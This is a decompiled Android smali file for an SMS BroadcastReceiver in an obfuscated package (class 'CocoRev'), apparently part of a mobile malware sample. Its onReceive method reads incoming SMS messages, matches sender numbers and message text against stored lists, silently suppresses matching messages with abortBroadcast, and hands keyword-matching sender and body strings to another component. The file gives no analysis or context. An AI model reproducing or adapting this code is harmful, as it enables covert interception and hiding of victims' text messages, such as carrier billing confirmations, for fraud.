.class public Lc/aguoqkle/n/CocoRev;
.super Landroid/content/BroadcastReceiver;


# instance fields
.field public a:Lc/aguoqkle/n/CocoMi;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private a(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 5

    const/4 v4, 0x1

    const/4 v3, -0x1

    const/4 v2, 0x0

    iget-object v0, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    if-nez v0, :cond_0

    invoke-static {}, Lc/aguoqkle/n/q;->a()V

    move v0, v4

    :goto_0
    return v0

    :cond_0
    iget-object v0, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iput v4, v0, Lc/aguoqkle/n/CocoMi;->m:I

    invoke-static {}, Lc/aguoqkle/n/q;->a()V

    iget-object v0, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->a:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-lez v0, :cond_1

    iget-object v0, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->a:Ljava/util/List;

    iget-object v1, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iget v1, v1, Lc/aguoqkle/n/CocoMi;->d:I

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lc/aguoqkle/n/t;

    iget-object v0, v0, Lc/aguoqkle/n/t;->f:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_1

    iget-object v0, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->a:Ljava/util/List;

    iget-object v1, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iget v1, v1, Lc/aguoqkle/n/CocoMi;->d:I

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lc/aguoqkle/n/t;

    iget-object v0, v0, Lc/aguoqkle/n/t;->f:Ljava/lang/String;

    invoke-virtual {p2, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    if-eq v0, v3, :cond_1

    invoke-static {}, Lc/aguoqkle/n/q;->a()V

    move v0, v2

    goto :goto_0

    :cond_1
    move v1, v2

    :goto_1
    iget-object v0, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->e:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-lt v1, v0, :cond_2

    move v1, v2

    :goto_2
    iget-object v0, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->f:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-lt v1, v0, :cond_4

    move v0, v4

    goto :goto_0

    :cond_2
    iget-object v0, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->e:Ljava/util/List;

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    invoke-static {}, Lc/aguoqkle/n/q;->b()V

    iget-object v0, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->e:Ljava/util/List;

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    if-eq v0, v3, :cond_3

    invoke-static {}, Lc/aguoqkle/n/q;->a()V

    move v0, v2

    goto :goto_0

    :cond_3
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto :goto_1

    :cond_4
    iget-object v0, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->f:Ljava/util/List;

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    invoke-static {}, Lc/aguoqkle/n/q;->b()V

    iget-object v0, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->f:Ljava/util/List;

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-virtual {p2, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    if-eq v0, v3, :cond_5

    invoke-static {}, Lc/aguoqkle/n/q;->a()V

    move v0, v2

    goto/16 :goto_0

    :cond_5
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto :goto_2
.end method


# virtual methods
.method public final a(Lc/aguoqkle/n/CocoMi;)V
    .locals 0

    iput-object p1, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 7

    const/4 v6, 0x0

    invoke-static {}, Lc/aguoqkle/n/q;->a()V

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v3, 0x0

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    if-eqz v0, :cond_2

    const-string v1, "pdus"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/Object;

    array-length v1, v0

    new-array v4, v1, [Landroid/telephony/SmsMessage;

    move v5, v6

    :goto_0
    array-length v1, v0

    if-lt v5, v1, :cond_3

    array-length v0, v4

    move-object v1, v3

    move v3, v6

    :goto_1
    if-lt v3, v0, :cond_4

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {}, Lc/aguoqkle/n/q;->b()V

    invoke-static {}, Lc/aguoqkle/n/q;->b()V

    const-string v0, "+86"

    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x3

    invoke-virtual {v1, v0}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v0

    move-object v1, v0

    :cond_0
    invoke-direct {p0, v1, v2}, Lc/aguoqkle/n/CocoRev;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1

    invoke-static {}, Lc/aguoqkle/n/q;->a()V

    invoke-virtual {p0}, Lc/aguoqkle/n/CocoRev;->abortBroadcast()V

    :cond_1
    iget-object v0, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->a:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-lez v0, :cond_2

    iget-object v0, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->a:Ljava/util/List;

    iget-object v3, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iget v3, v3, Lc/aguoqkle/n/CocoMi;->d:I

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lc/aguoqkle/n/t;

    iget-object v0, v0, Lc/aguoqkle/n/t;->f:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_2

    iget-object v0, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->a:Ljava/util/List;

    iget-object v3, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    iget v3, v3, Lc/aguoqkle/n/CocoMi;->d:I

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lc/aguoqkle/n/t;

    iget-object v0, v0, Lc/aguoqkle/n/t;->f:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    const/4 v3, -0x1

    if-eq v0, v3, :cond_2

    invoke-static {}, Lc/aguoqkle/n/q;->b()V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, "="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {}, Lc/aguoqkle/n/q;->b()V

    iget-object v1, p0, Lc/aguoqkle/n/CocoRev;->a:Lc/aguoqkle/n/CocoMi;

    invoke-virtual {v1, v0}, Lc/aguoqkle/n/CocoMi;->a(Ljava/lang/String;)V

    :cond_2
    invoke-static {}, Lc/aguoqkle/n/q;->a()V

    return-void

    :cond_3
    aget-object v1, v0, v5

    check-cast v1, [B

    invoke-static {v1}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v1

    aput-object v1, v4, v5

    add-int/lit8 v1, v5, 0x1

    move v5, v1

    goto/16 :goto_0

    :cond_4
    aget-object v1, v4, v3

    invoke-virtual {v1}, Landroid/telephony/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Landroid/telephony/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;

    invoke-static {}, Lc/aguoqkle/n/q;->b()V

    invoke-virtual {v1}, Landroid/telephony/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {}, Lc/aguoqkle/n/q;->b()V

    add-int/lit8 v3, v3, 0x1

    goto/16 :goto_1
.end method
